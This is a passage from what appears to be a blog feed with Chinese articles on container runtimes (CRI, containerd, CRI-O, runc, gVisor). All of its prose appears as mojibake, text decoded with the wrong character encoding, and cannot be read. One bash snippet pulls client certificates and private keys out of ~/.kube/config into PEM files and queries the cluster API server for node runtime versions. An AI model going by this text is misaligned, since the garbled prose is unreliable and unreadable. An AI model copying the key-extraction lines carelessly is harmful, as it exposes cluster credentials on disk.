"></p><p>å½“ç„¶ï¼Œä¹Ÿå¹¶ä¸æ˜¯æ‰€æœ‰çš„èŠ‚ç‚¹éƒ½ä¼šå®‰è£…<code>kubectl</code>çš„ï¼Œ<code>kubectl</code>ä¹Ÿåªæ˜¯å‘<code>api server</code>å‘èµ·è¯·æ±‚è€Œå·²ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>curl</code> å»è¯¢é—®<code>api server</code>ï¼šâ€œä½ çš„èŠ‚ç‚¹ä¿¡æ¯æ˜¯å¤šå°‘å‘€ï¼Ÿâ€ï¼Œæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªâ€œä¸€ç«™å¼å‘½ä»¤â€ï¼Œå¯ä»¥åœ¨è¯¢é—®çš„æ—¶å€™å¸¦ä¸Šè¯ä¹¦ä¿¡æ¯ï¼Œå½“ç„¶å‰ææ˜¯ï¼Œæˆ‘ä»¬æ‰€å¸¦ä¸Šçš„è¯ä¹¦ä¿¡æ¯å¯ä»¥æœ‰è®¿é—®æ‰€æœ‰èŠ‚ç‚¹çš„ä¿¡æ¯çš„æƒé™ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> clientcert=$(grep client-cert ~/.kube/config |<span class="hljs-built_in">cut</span> -d<span class="hljs-string">&quot; &quot;</span> -f 6)<br><span class="hljs-built_in">export</span> clientkey=$(grep client-key-data ~/.kube/config |<span class="hljs-built_in">cut</span> -d<span class="hljs-string">&quot; &quot;</span> -f 6)<br><span class="hljs-built_in">export</span> certauth=$(grep certificate-authority-data ~/.kube/config |<span class="hljs-built_in">cut</span> -d<span class="hljs-string">&quot; &quot;</span> -f 6)<br><span class="hljs-built_in">export</span> api_server=$(grep server ~/.kube/config|<span class="hljs-built_in">cut</span> -d<span class="hljs-string">&quot; &quot;</span> -f 6)<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$clientcert</span> | <span class="hljs-built_in">base64</span> -d &gt; ./client.pem<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$clientkey</span> | <span class="hljs-built_in">base64</span> -d &gt; ./client-key.pem<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$certauth</span> | <span class="hljs-built_in">base64</span> -d &gt; ./ca.pem<br><span class="hljs-comment"># kubectl -v=8 cmd å¯ä»¥ç›´æ¥è·å–apiæ¥å£åœ°å€</span><br>curl --cert ./client.pem --key ./client-key.pem --cacert ./ca.pem <span class="hljs-variable">$api_server</span>/api/v1/nodes | jq .items[].status.nodeInfo.containerRuntimeVersion<br></code></pre></td></tr></table></figure><p><img src="/image/image_XNp6LYZJQi.png" alt="å›¾ 15ï¼šå¸¦ä¸Šè¯ä¹¦ä¿¡æ¯ï¼Œå‘ API Server å‘èµ·è¯·æ±‚ï¼Œå¹¶ä»è¿”å›çš„ç»“æœä¸­è¿‡æ»¤å®¹å™¨ Runtime çš„ä¿¡æ¯" title="å›¾15ï¼šå¸¦ä¸Šè¯ä¹¦ä¿¡æ¯ï¼Œå‘API Server å‘èµ·è¯·æ±‚ï¼Œå¹¶ä»è¿”å›çš„ç»“æœä¸­è¿‡æ»¤å®¹å™¨ Runtime çš„ä¿¡æ¯"></p><p>å¦‚æœä½ é—®æˆ‘ï¼Œå¦‚ä½•å¿«é€ŸçŸ¥é“ï¼šæ‰§è¡Œä¸€ä¸ª kubeclt å‘½ä»¤ï¼Œå®é™…ä¸Šå‘èµ·äº†ä»€ä¹ˆè¯·æ±‚ã€‚æˆ‘åªèƒ½å‘Šè¯‰ä½ ï¼Œå¯ä»¥ä½¿ç”¨ <code>-v 8</code>æ‰“å°å‡ºæ›´å¤šçš„ debug ä¿¡æ¯ã€‚</p><p><img src="/image/image_YwCeOOAq3r.png" alt="å›¾ 16ï¼šä½¿ç”¨ -v 8 æŸ¥çœ‹æ›´å¤šçš„ä¿¡æ¯" title="å›¾16ï¼šä½¿ç”¨ -v 8 æŸ¥çœ‹æ›´å¤šçš„ä¿¡æ¯"></p><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•çœ‹å¾… CRI å‘¢ï¼Ÿå®¹å™¨æœ¬èº«ä¸äº§ç”Ÿä»·å€¼ï¼Œäº§ç”Ÿä»·å€¼çš„æ˜¯å®¹å™¨ç¼–æ’ï¼Œè€Œ Kubernetes åœ¨å®¹å™¨ç¼–æ’çš„ä¸–ç•Œé‡Œåˆå æ®ä¸»å¯¼çš„åœ°ä½ï¼ŒCRI å¯ä»¥è®© Kubernetes è½»æ¾æ¾æ¾åœ°å°±å¯ä»¥ä½¿ç”¨å„ç§ä¸åŒçš„å®¹å™¨ Runtimeï¼Œæ‰€ä»¥ Kubernetes æ‰€å®šä¹‰çš„<strong>CRI æ˜¯ç°åœ¨ä¹ƒè‡³æœªæ¥å¯èƒ½å­˜åœ¨çš„ä»»ä½•ç±»å‹çš„å®¹å™¨ Runtime çš„æŠ½è±¡</strong>ã€‚</p><h2 id="0x04-containerd-å’Œ-CRI-O"><a href="#0x04-containerd-å’Œ-CRI-O" class="headerlink" title="0x04 containerd å’Œ CRI-O"></a>0x04 containerd å’Œ CRI-O</h2><p>é€šè¿‡ä¸Šæ–‡ï¼Œæˆ‘ä»¬çŸ¥é“ Docker Engine ä¼šè°ƒç”¨ä¸€äº›åº•å±‚çš„å·¥å…·ï¼Œé‚£ä¹ˆè¿™äº›å·¥å…·åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå®ƒä»¬æ˜¯å¦‚ä½•ç»„ç»‡èµ·æ¥çš„å‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹çœ‹ç¬¬ä¸€å±‚é«˜çº§çš„å®¹å™¨ Runtimeï¼Œé‚£å°±æ˜¯ç”± Docker åˆ›å»ºçš„ containerd å’Œ Red Hat åˆ›å»ºçš„ CRI-Oã€‚</p><h3 id="4-1-containerd"><a href="#4-1-containerd" class="headerlink" title="4.1 containerd"></a>4.1 containerd</h3><p>containerd æ˜¯æ¥è‡ªäº Docker çš„è¾ƒé«˜å±‚çš„å®¹å™¨ Runtimeï¼Œå®ƒå®ç°äº† CRI è§„èŒƒï¼Œå¹¶ä¸”å¯ä»¥ä»ä»“åº“ä¸­æ‹‰å–é•œåƒè¿›è¡Œç®¡ç†ï¼Œç„¶åç§»äº¤ç»™è¾ƒåº•å±‚çš„å®¹å™¨ Runtimeã€‚åº•å±‚çš„å®¹å™¨ Runtime æœ€ç»ˆä¼šä½¿ç”¨ Linux å†…æ ¸çš„åŠŸèƒ½æ¥åˆ›å»ºè¢«æˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œå®¹å™¨â€çš„è¿›ç¨‹ã€‚</p><p>containerd è¯ç”Ÿäº Docker çš„é¡¹ç›®é‡Œçš„ä¸€éƒ¨åˆ†ï¼Œä½†ä¸ºä»€ä¹ˆè¦åˆ†å¼€å‘¢ï¼Ÿä¸»è¦æ˜¯ containerd å¯ä»¥è®© Docker çš„ä»£ç æ›´åŠ æ¨¡å—åŒ–ï¼Œè®©â€œDocker é£æ ¼â€çš„å®¹å™¨æ— éœ€ä½¿ç”¨ Docker å®ˆæŠ¤è¿›ç¨‹å’Œ Docker CLI å·¥å…·ï¼Œå°±å¯ä»¥åœ¨æ›´å¤šçš„ç¼–æ’å·¥å…·ï¼ˆä¾‹å¦‚ Kubernetesï¼‰ä¸­è¿è¡Œã€‚</p><p><img src="/image/architecture_tqfjjdsGBK.png" alt="å›¾ 17ï¼šcontainerd çš„æ¶æ„å›¾" title="å›¾17ï¼šcontainerd çš„æ¶æ„å›¾"></p><p>å½“æˆ‘ä»¬æŸ¥çœ‹ Docker çš„å®˜æ–¹ä¸‹è½½æ–‡æ¡£çš„æ—¶å€™ï¼Œæˆ‘ä»¬åº”è¯¥ä¹Ÿæ³¨æ„åˆ°äº†ï¼šå®‰è£… Docker çš„æ—¶å€™ï¼Œè¿˜éœ€è¦å®‰è£… containerdã€‚é‚£æ˜¯å› ä¸º Docker Engine å†…éƒ¨ä¼šä½¿ç”¨åˆ° containerdã€‚</p><p><img src="/image/image_Kjed0bvzDM.png" alt="å›¾ 18ï¼šåœ¨ ubuntu ä¸­å®‰è£… docker è¿˜éœ€è¦å®‰è£… containerd " title="å›¾18ï¼šåœ¨ ubuntuä¸­å®‰è£… dockerè¿˜éœ€è¦å®‰è£…containerd"></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ containerd ä½œä¸º Kubernetes çš„å®¹å™¨ Runtimeï¼Œå› ä¸º conatinerd é€šè¿‡ <code>cri</code>æ’ä»¶ï¼Œå®ç°äº† Kubernetes çš„ CRIã€‚</p><h3 id="4-2-CRI-O"><a href="#4-2-CRI-O" class="headerlink" title="4.2 CRI-O"></a>4.2 CRI-O</h3><p><a href="https://cri-o.io/" title="CRI-O">CRI-O</a>åˆæ˜¯å¦å¤–ä¸€ä¸ªå®ç°äº† Kubernetes CRI çš„é«˜å±‚å®¹å™¨ Runtimeï¼Œå®ƒæ˜¯ containerd çš„æ›¿ä»£å“ï¼Œå¯ä»¥ä»ä»“åº“ä¸­æ‹‰å–é•œåƒï¼Œå¹¶åœ¨ç£ç›˜ä¸Šè¿›è¡Œç®¡ç†ï¼Œç„¶åè°ƒç”¨è¾ƒåº•å±‚çš„å®¹å™¨ Runtime æ¥å¯åŠ¨å®¹å™¨ã€‚</p><p><img src="/image/image_BnAIX0hX3X.png" alt="å›¾ 19ï¼šORI-O æ¶æ„å›¾" title="å›¾19ï¼šORI-O æ¶æ„å›¾"></p><p><a href="https://thenewstack.io/oci-building-way-kubernetes-run-containers-without-docker/" title="CRIè„±èƒäºRedHatã€TBMã€Intelå’ŒSUSEç­‰å…¬å¸">CRI è„±èƒäº RedHatã€TBMã€Intel å’Œ SUSE ç­‰å…¬å¸</a>ï¼Œæ˜¯ä¸ºäº†æˆä¸º Kubernetes çš„å®¹å™¨ Runtime æ‰€åˆ›å»ºçš„ï¼Œå®ƒå’Œ containerd ä¸€æ ·ï¼Œå¯ä»¥æä¾›å¯åŠ¨ã€åœæ­¢å’Œé‡å¯å®¹å™¨çš„èƒ½åŠ›ã€‚</p><h2 id="0x05-runc-VS-å…¶ä»–åº•å±‚å®¹å™¨-Runtime"><a href="#0x05-runc-VS-å…¶ä»–åº•å±‚å®¹å™¨-Runtime" class="headerlink" title="0x05 runc VS å…¶ä»–åº•å±‚å®¹å™¨ Runtime"></a>0x05 runc VS å…¶ä»–åº•å±‚å®¹å™¨ Runtime</h2><h3 id="5-1-runc"><a href="#5-1-runc" class="headerlink" title="5.1 runc"></a>5.1 runc</h3><p>runc æ˜¯ä¸€ä¸ªå…¼å®¹ OCI è§„èŒƒçš„å®¹å™¨ Runtimeï¼Œå¯ä»¥åˆ›å»ºå¹¶è¿è¡Œå®¹å™¨ã€‚æœ‰æ—¶ï¼Œrunc ç”šè‡³è¢«ç§°ä¹‹ä¸º OCI çš„â€œå‚è€ƒå®ç°â€ã€‚</p><p><img src="/image/image_A0kNnz5-Hh.png" alt="å›¾ 20:runc çš„æ¶æ„å›¾" title="å›¾20:runc çš„æ¶æ„å›¾"></p><p>å‚è€ƒå®ç°ï¼ˆreference implementationï¼‰æ˜¯ä¸€ç§å®Œå…¨å®ç°äº†æŸä¸ªè§„èŒƒæˆ–æ ‡å‡†çš„æ‰€æœ‰è¦æ±‚çš„è½¯ä»¶ã€‚runc æä¾›äº†ä¸€ä¸ªç¬¦åˆ OCI è§„èŒƒçš„å®¹å™¨ Runtime æ‰€æœŸå¾…çš„æ‰€æœ‰ç‰¹æ€§ï¼Œä»¥ä¾›ä»»ä½•äººå‚è€ƒï¼Œåˆ›å»ºè‡ªå·±æ‰€éœ€è¦çš„ OCI Runtimeã€‚</p><p>runc ä¸ Linux åŸç”Ÿçš„åº•å±‚åŠŸèƒ½ï¼ˆä¾‹å¦‚ namespace å’Œ cgroupï¼‰è¿›è¡Œäº¤äº’ï¼Œä¸ºå®¹å™¨æä¾›æ‰€æœ‰çš„åº•å±‚åŠŸèƒ½æ¥åˆ›å»ºå¹¶è¿è¡Œå®¹å™¨ã€‚</p><p>runc æ˜¯è®¸å¤šå®¹å™¨ Runtime çš„åŸºçŸ³ï¼Œæ‰€ä»¥æ¯å½“è¢«æ›å‡ºæ¼æ´çš„æ—¶å€™ï¼Œå¾€å¾€æ˜¯ä¸€ç‰‡å“€åšã€‚æˆ‘ä»¬æ¥ä¸¾ä¸ªä¸æ°å½“çš„ä¾‹å­ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå½“ç„¶è¿™ä¹Ÿä¸æ˜¯ä¸€ä¸ªååˆ†ä¸¥è°¨çš„æ¯”å–»ï¼Œæ¯•ç«Ÿ runc æ˜¯ç”± OCI ç»´æŠ¤çš„ï¼Œè€Œä¸æ˜¯ä¸ªäººå¼€å‘è€…ã€‚</p><p><img src="/image/image_Ys01c-WXAX.png" alt="å›¾ 21ï¼šä¸€ä¸ªä¸æ°å½“çš„ä¾‹å­" title="å›¾21ï¼šä¸€ä¸ªä¸æ°å½“çš„ä¾‹å­"></p><h3 id="5-2-å…¶ä»–çš„åº•å±‚å®¹å™¨-Runtime"><a href="#5-2-å…¶ä»–çš„åº•å±‚å®¹å™¨-Runtime" class="headerlink" title="5.2 å…¶ä»–çš„åº•å±‚å®¹å™¨ Runtime"></a>5.2 å…¶ä»–çš„åº•å±‚å®¹å™¨ Runtime</h3><p>ä½†æ˜¯ï¼Œrunc å¹¶ä¸æ˜¯å”¯ä¸€çš„åº•å±‚å®¹å™¨ runtimeï¼Œå› ä¸º OCI è§„èŒƒè¿è¡Œå…¶ä»–çš„å·¥å…·ä»¥ä¸åŒçš„æ–¹å¼å®ç°ç›¸åŒçš„åŠŸèƒ½ï¼š</p><ul><li><a href="https://github.com/containers/crun" title="crun">crun</a>ï¼šä¸€ä¸ªç”¨ C ç¼–å†™çš„å®¹å™¨ Runtimeï¼ˆç›¸æ¯”ä¹‹ä¸‹ï¼Œrunc æ˜¯ç”¨ Go å†™çš„ï¼ŒGo åœ¨äº‘åŸç”Ÿçš„ç”Ÿæ€ä¸­æ˜¯ä¸»æµçš„ç¼–ç¨‹è¯­è¨€ï¼‰ã€‚</li><li><a href="https://github.com/firecracker-microvm/firecracker-containerd" title="firecracker-containerd">firecracker-containerd</a>ï¼šæ˜¯ AWS æ‰€å¼€å‘çš„åº•å±‚çš„å®¹å™¨ Runtimeï¼Œå®ƒå¯ä»¥å°† OCI è§„èŒƒå®ç°æˆå•ç‹¬çš„è½»é‡çº§çš„è™šæ‹Ÿæœºï¼Œå¹¶ä¸”è¿˜æ˜¯æ”¯æŒ AWS Lambda çš„ç›¸åŒæŠ€æœ¯ï¼ˆå’Œ runc ç›¸æ¯”ï¼Œfirecracker-containerd æä¾›äº†è™šæ‹Ÿæœºçº§åˆ«çš„éš”ç¦»ï¼›å’Œè™šæ‹Ÿæœºç›¸æ¯”ï¼Œfirecracker-containerd æ›´è½»é‡çº§ï¼Œå¯åŠ¨é€Ÿåº¦æ›´å¿«ï¼Œèµ„æºå ç”¨æ›´å°‘ï¼‰ã€‚</li><li><a href="https://gvisor.dev/" title="gVisor">gVisor</a>ï¼šæ˜¯ Google æ‰€å¼€å‘çš„åº•å±‚çš„å®¹å™¨ Runtimeï¼Œå®ƒå¯ä»¥åˆ›å»ºæ‹¥æœ‰è‡ªå·±çš„å†…æ ¸çš„å®¹å™¨ï¼Œè€Œæ— éœ€å’Œå®¿ä¸»æœºå…±äº«å†…æ ¸ã€‚åŒæ—¶ï¼ŒgVisor è¿˜åœ¨<code>runsc</code>ä¸­å…¼å®¹ OCI è§„èŒƒã€‚</li></ul><h2 id="0x06-æ€»ç»“"><a href="#0x06-æ€»ç»“" class="headerlink" title="0x06 æ€»ç»“"></a>0x06 æ€»ç»“</h2><p>æœ¬æ–‡ï¼Œæˆ‘ä»¬äº†è§£åˆ°äº† Docker åªæ˜¯å®¹å™¨ç”Ÿæ€ç³»ç»Ÿä¸­çš„ä¸€éƒ¨åˆ†ã€‚</p><p>ç†è®ºä¸Šæ¥è¯´ï¼Œåªè¦æˆ‘ä»¬é€‰ç”¨çš„å®¹å™¨ Runtime ç¬¦åˆåŒä¸€ç»„æ ‡å‡†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨ä½¿ç”¨ä¸­æ— ç¼åˆ‡æ¢ã€‚åƒæ˜¯ containerdã€runc å’Œ CRI-O éƒ½å®ç°äº†è¿™äº›æ ‡å‡†çš„éƒ¨åˆ†å†…å®¹ã€‚</p><p>åœ¨ Kubernetes ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©å„ç§å®¹å™¨ Runtimeï¼Œåªè¦å®ƒå®ç°äº† CRI çš„è§„èŒƒï¼Œä¾‹å¦‚ containerd å’Œ CRI-O ç­‰ç­‰ï¼›</p>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æµ…è°ˆå®¹å™¨è¿è¡Œæ—¶</title>
    <link href="/2024/07/08/%E6%B5%85%E8%B0%88%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E6%97%B6/"/>
    <url>/2024/07/08/%E6%B5%85%E8%B0%88%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E6%97%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>å®¹å™¨è¿è¡Œæ—¶ï¼ˆContainer Runtimeï¼Œç®€ç§° Runtimeï¼‰éœ€è¦é€šè¿‡å’Œæ“ä½œç³»ç»Ÿå†…æ ¸è¿›è¡Œç´§å¯†åä½œï¼Œæ¥ä¸ºå®¹å™¨æä¾›è¿è¡Œç¯å¢ƒï¼Œæ˜¯å®¹å™¨çœŸæ­£è¿è¡Œçš„åœ°æ–¹ã€‚</p><p>å¦‚æœå¤§å®¶ä½¿ç”¨è¿‡ Javaï¼Œå¯ä»¥ç®€å•è®¤ä¸º Java ç¨‹åºå°±æ˜¯å®¹å™¨ï¼ŒJVM å°±æ˜¯ Runtimeï¼›JVM éœ€è¦ä¸º Java ç¨‹åºæä¾›è¿è¡Œç¯å¢ƒï¼Œè€Œå®¹å™¨éœ€è¦åœ¨ Runtime ä¸­è¿è¡Œã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä»¥æ–°æ‰‹çš„è§†è§’æ¥æµ…è°ˆä¸€ä¸‹å®¹å™¨è¿è¡Œæ—¶çš„åŠŸèƒ½ã€ç±»å‹ã€å¸¸è§å·¥å…·ä»¥åŠå®‰å…¨é£é™©ï½</p><h2 id="0x01-Runtime-çš„åŠŸèƒ½"><a href="#0x01-Runtime-çš„åŠŸèƒ½" class="headerlink" title="0x01 Runtime çš„åŠŸèƒ½"></a>0x01 Runtime çš„åŠŸèƒ½</h2><p>å®¹å™¨æŠ€æœ¯èµ·æºäºæ—©æœŸçš„ Unix ç³»ç»Ÿã€‚åœ¨<a href="../../../../2024/06/07/%E7%AC%AC-1-%E8%AF%BE-%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/">ã€Šç¬¬ 1 è¯¾ å®¹å™¨å®‰å…¨å¨èƒå»ºæ¨¡ã€‹</a>ä¸­ï¼Œæˆ‘ä»¬äº†è§£åˆ°ï¼š<strong>2013 å¹´ 3 æœˆ 15 æ—¥ Docker é—®ä¸–ï¼Œä¸ºå¼€å‘è€…æä¾›äº†ä¸€ç§ä¾¿æ·çš„æ‰“åŒ…æ–¹å¼ï¼Œä½¿åº”ç”¨ç¨‹åºâ€œä¸€å¤„æ„å»ºï¼Œå¤„å¤„è¿è¡Œâ€ï¼Œä»¥è‡³äºå®¹å™¨å†æ¬¡â€œç¿»çº¢â€ï¼Œå½¢æˆä¸€é“æ–°çš„ç§‘æŠ€æµªæ½®ã€‚</strong></p><p><img src="/image/image_Z3pz0-REoT.png" alt="å›¾ 1ï¼šDocker çš„åˆ›å§‹äºº Solomon Hykes åœ¨ PyCon ä¸Šé¦–æ¬¡å‘å…¨ä¸–ç•Œå…¬å¼€å±•ç¤ºäº† Docker" title="å›¾ 1 ï¼šDocker çš„åˆ›å§‹äººSolomon Hykesåœ¨ PyCon ä¸Šé¦–æ¬¡å‘å…¨ä¸–ç•Œå…¬å¼€å±•ç¤ºäº† Docker"></p><p>ä¸è™šæ‹Ÿæœºä¸åŒï¼Œ<strong>å®¹å™¨ä¸å®¿ä¸»æœºå…±äº«æ“ä½œç³»ç»Ÿå†…æ ¸</strong>ï¼Œåœ¨æ•ˆç‡ä¸Šæ›´å¿«ä¸€äº›ï¼Œè¿™ç§æ•ˆç‡ä½¿å¾—å®¹å™¨æˆä¸ºéƒ¨ç½²å¾®æœåŠ¡ã€å®ç°å¯æ‰©å±•ã€é«˜æ€§èƒ½åº”ç”¨ç¨‹åºçš„ç†æƒ³é€‰æ‹©ã€‚</p><p><img src="/image/image_4Bo492biJE.png" alt="å›¾ 2ï¼šDocker å®¹å™¨ VS è™šæ‹Ÿæœº" title="å›¾ 2ï¼šDocker å®¹å™¨ VS è™šæ‹Ÿæœº"></p><p>ä½†æ­£å¦‚ CNCF çš„å¹´åº¦æŠ¥å‘Šæ‰€è°ƒæŸ¥çš„é‚£æ ·ï¼šâ€œä¸€ä¸ªå…¬å¸ä½¿ç”¨å®¹å™¨çš„èŒƒå›´è¶Šå¹¿ï¼Œä»–ä»¬å°±è¶Šæœ‰å¯èƒ½å°†å®‰å…¨æ€§è§†ä¸ºå®¹å™¨çš„ä¸€å¤§éš¾é¢˜â€ã€‚</p><p>ç†è§£å®¹å™¨çš„æ ¸å¿ƒåŠŸèƒ½å¯¹äºç†è§£ Runtime å¦‚ä½•ä¿ƒè¿›å®¹å™¨çš„æ— ç¼æ‰§è¡Œå’Œå¦‚ä½•ç®¡ç†å®¹å™¨è‡³å…³é‡è¦ã€‚</p><h3 id="1-1-Runtime-è¿è¡Œå®¹å™¨çš„æ­¥éª¤"><a href="#1-1-Runtime-è¿è¡Œå®¹å™¨çš„æ­¥éª¤" class="headerlink" title="1.1 Runtime è¿è¡Œå®¹å™¨çš„æ­¥éª¤"></a>1.1 Runtime è¿è¡Œå®¹å™¨çš„æ­¥éª¤</h3><ol><li><strong>åˆ›å»ºå®¹å™¨</strong>ï¼Œå¹¶æ ¹æ®é•œåƒä¸­çš„åº”ç”¨ç¨‹åºåŠå…¶ä¾èµ–åˆå§‹åŒ–ç¯å¢ƒï¼›</li><li><strong>è¿è¡Œå®¹å™¨</strong>ï¼Œå¯åŠ¨åº”ç”¨ç¨‹åºå¹¶ç¡®ä¿å…¶æ­£å¸¸è¿è¡Œï¼›</li><li><strong>ç®¡ç†å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸ</strong>ï¼Œä¾‹å¦‚ï¼š<ol><li>ç›‘æ§å®¹å™¨çš„è¿è¡ŒçŠ¶å†µï¼›</li><li>åœ¨å®¹å™¨å‘ç”Ÿæ•…éšœçš„æ—¶å€™é‡å¯å®¹å™¨ï¼›</li><li>åœ¨ä¸ä½¿ç”¨å®¹å™¨æ—¶æ¸…ç†èµ„æºï¼›</li></ol></li></ol><h3 id="1-2-ä¸å®¿ä¸»æœºçš„æ“ä½œç³»ç»Ÿäº¤äº’"><a href="#1-2-ä¸å®¿ä¸»æœºçš„æ“ä½œç³»ç»Ÿäº¤äº’" class="headerlink" title="1.2 ä¸å®¿ä¸»æœºçš„æ“ä½œç³»ç»Ÿäº¤äº’"></a>1.2 ä¸å®¿ä¸»æœºçš„æ“ä½œç³»ç»Ÿäº¤äº’</h3><p>Runtime éœ€è¦ä¸å®¿ä¸»æœºçš„æ“ä½œç³»ç»Ÿè¿›è¡Œç´§å¯†äº¤äº’ã€‚ä¾‹å¦‚æ“ä½œç³»ç»Ÿçš„<a href="https://blog.nginx.org/blog/what-are-namespaces-cgroups-how-do-they-work" title="namespace å’Œcgroup">namespace å’Œ cgroup</a>ã€‚</p><p><strong>å®ƒä»¬åˆ©ç”¨æ“ä½œç³»ç»Ÿçš„å„ç§åŠŸèƒ½æ¥éš”ç¦»å’Œç®¡ç†æ¯ä¸ªå®¹å™¨çš„èµ„æº</strong>ï¼Œç¡®ä¿å®¹å™¨å†…çš„è¿›ç¨‹æ— æ³•å¹²æ‰°å…¶ä»–çš„å®¹å™¨æˆ–å®¿ä¸»æœºï¼Œä»è€Œä¿æŒä¸€ä¸ªå®‰å…¨ç¨³å®šçš„ç¯å¢ƒã€‚</p><h3 id="1-3-èµ„æºçš„åˆ†é…å’Œç®¡ç†"><a href="#1-3-èµ„æºçš„åˆ†é…å’Œç®¡ç†" class="headerlink" title="1.3 èµ„æºçš„åˆ†é…å’Œç®¡ç†"></a>1.3 èµ„æºçš„åˆ†é…å’Œç®¡ç†</h3><p>Runtime è¿˜æ˜¯èµ„æºç®¡ç†çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå› ä¸ºå®ƒä»¬å¯ä»¥ä¸ºæ¯ä¸ªå®¹å™¨åˆ†é…å’Œè°ƒèŠ‚ CPUã€å†…å­˜å’Œ I&#x2F;Oï¼Œä»¥é˜²æ­¢è¿‡åº¦å ç”¨èµ„æºã€‚</p><p>è¿™ç§ç‰¹æ€§åœ¨å¤šç§Ÿæˆ·ç¯å¢ƒä¸­å°¤ä¸ºå¸¸è§ï¼Œè‹¥è¦äº†è§£å¤šç§Ÿæˆ·ç›¸å…³çš„çŸ¥è¯†ï¼Œè¯·æŸ¥çœ‹<a href="../../../../2024/06/17/1-4-%E5%A4%9A%E7%A7%9F%E6%88%B7/">ã€Š1.4 å¤šç§Ÿæˆ·ã€‹</a>ã€‚</p><h2 id="0x02-Runtime-VS-Engine"><a href="#0x02-Runtime-VS-Engine" class="headerlink" title="0x02 Runtime VS Engine"></a>0x02 Runtime VS Engine</h2><p>è™½ç„¶å®¹å™¨è¿è¡Œæ—¶ï¼ˆContainer Runtimeï¼Œç®€ç§° Runtimeï¼‰è´Ÿè´£è¿è¡Œå®¹å™¨ï¼Œä½†å®¹å™¨å¼•æ“ï¼ˆContainer Engineï¼Œç®€ç§° Engineï¼‰æ˜¯ä¸€ä¸ªæ›´å¹¿æ³›çš„ç³»ç»Ÿã€‚Engine å¯ä»¥ç®¡ç†æ›´å¤šçš„å®¹å™¨ç”Ÿå‘½å‘¨æœŸï¼Œä¾‹å¦‚ï¼šé•œåƒçš„åˆ†å‘ã€å®¹å™¨çš„ç¼–æ’å’Œ Runtime çš„ç®¡ç†ã€‚</p><p>ä¸€ä¸ªå¸¸è§çš„è¯¯åŒºæ˜¯ï¼šRuntime ç­‰äº Engineã€‚ä»¥ Docker ä¸ºä¾‹ï¼Œè™½ç„¶ Docker çš„ Engine åŒ…å«äº† Runtimeï¼Œä½†å®ƒè¿˜æä¾›äº†ä¸€å¥—ç”¨äºæ„å»ºã€äº¤ä»˜å’Œè¿è¡Œå®¹å™¨åŒ–åº”ç”¨ç¨‹åºçš„å·¥å…·ã€‚</p><h2 id="0x03-Runtime-çš„ç±»å‹"><a href="#0x03-Runtime-çš„ç±»å‹" class="headerlink" title="0x03 Runtime çš„ç±»å‹"></a>0x03 Runtime çš„ç±»å‹</h2><p>ä¸ºäº†æ»¡è¶³åŸºæœ¬çš„å®¹å™¨è¿è¡Œåˆ°å¤æ‚çš„å®¹å™¨ç¼–æ’çš„éœ€æ±‚ï¼Œå®¹å™¨è¿è¡Œæ—¶å¤§è‡´å¯ä»¥åˆ†ä¸ºåº•å±‚çš„ Runtimeã€é«˜å±‚çš„ Runtime å’Œä¸“é—¨çš„ Runtimeã€‚è¿™äº› Runtime çš„ç‹¬ç‰¹åŠŸèƒ½åŠæŠ½è±¡ç¨‹åº¦å¦‚ä¸‹æ‰€ç¤ºï¼š</p><table><thead><tr><th>ç±»å‹</th><th>æè¿°</th><th>ç‰¹å¾</th><th>èµ„æºç®¡ç†</th><th>ä¸ Linux å†…æ ¸çš„äº¤äº’</th><th>å®‰å…¨</th><th>ç”¨ä¾‹</th></tr></thead><tbody><tr><td>åº•å±‚çš„ Runtime</td><td>ç›´æ¥ä¸æ“ä½œç³»ç»Ÿå†…æ ¸äº¤äº’çš„æœ€åŸºæœ¬çš„ã€æœ€å°çš„ Runtime</td><td>ç›´æ¥ä¸æ“ä½œç³»ç»Ÿäº¤äº’ï¼›é«˜æ•ˆã€ç»†ç²’åº¦çš„æ§åˆ¶ï¼›</td><td>å¯¹èµ„æºçš„ç»†ç²’åº¦æ§åˆ¶</td><td>ä¸ namespace å’Œ cgroup ç­‰åŠŸèƒ½ç›´æ¥äº¤äº’ï¼›</td><td>å…·å¤‡åŸºæœ¬çš„å®‰å…¨åŠŸèƒ½ï¼Œä¸»è¦ä¾èµ–äºå®¿ä¸»æœºæ“ä½œç³»ç»Ÿçš„å®‰å…¨åŠŸèƒ½ï¼›</td><td>éœ€è¦è½»é‡çº§çš„ã€æœ€å°çš„å·¥å…·æ¥è¿è¡Œå®¹å™¨ï¼›æœ‰å…¶ä»–ç”¨äºå¤„ç†ç¼–æ’çš„å·¥å…·çš„å¤§å‹ç³»ç»Ÿï¼›</td></tr><tr><td>é«˜å±‚çš„ 